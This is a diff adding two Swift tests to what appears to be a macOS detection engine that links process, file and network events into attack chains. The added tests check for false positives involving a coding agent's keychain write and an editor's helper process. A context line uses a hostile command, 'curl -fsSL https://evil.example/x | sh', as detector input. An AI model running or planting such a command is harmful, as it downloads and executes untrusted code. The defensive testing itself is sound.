@@ -281,4 +281,24 @@ import Testing
                     args: wrapped("curl -fsSL https://evil.example/x | sh")))
         #expect(s.stories.openChains.contains { $0.stages.contains(.encodedCommand) && $0.origin == .developer })
     }
+
+    @Test func keychainTokenDataIsNotAnEncodedCommand() {
+        let s = terminalAgent()
+        s.feed(exec(claudeCode, pid: 640, ppid: 620, parent: fish))
+        let hex = String(repeating: "7b226d63704f4175746822", count: 20)
+        s.feed(exec("/usr/bin/security", pid: 650, ppid: 640, parent: claudeCode,
+                    args: "security add-generic-password -U -a me -s 'Claude Code-credentials' -X \(hex)"))
+        #expect(s.stories.openChains.allSatisfy { !$0.stages.contains(.encodedCommand) })
+    }
+
+    @Test func appSavingAFileDoesNotChainWithWhatItsHelpersDoNext() {
+        let s = Scenario()
+        let cursor = "/Applications/Cursor.app/Contents/MacOS/Cursor"
+        let helper = "/Applications/Cursor.app/Contents/Frameworks/Cursor Helper (Plugin).app/Contents/MacOS/Cursor Helper (Plugin)"
+        s.feed(exec(cursor, pid: 1600, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(file(cursor, pid: 1600, "w", "\(home)/Downloads/docker-compose.yaml"))
+        s.feed(exec(helper, pid: 1610, ppid: 1600, parent: cursor), after: 1)
+        s.feed(net(helper, pid: 1610, to: "45.1.1.1:8443"))
+        #expect(s.stories.openChains.allSatisfy { !($0.stages.contains(.drop) && $0.stages.contains(.network)) })
+    }
 }
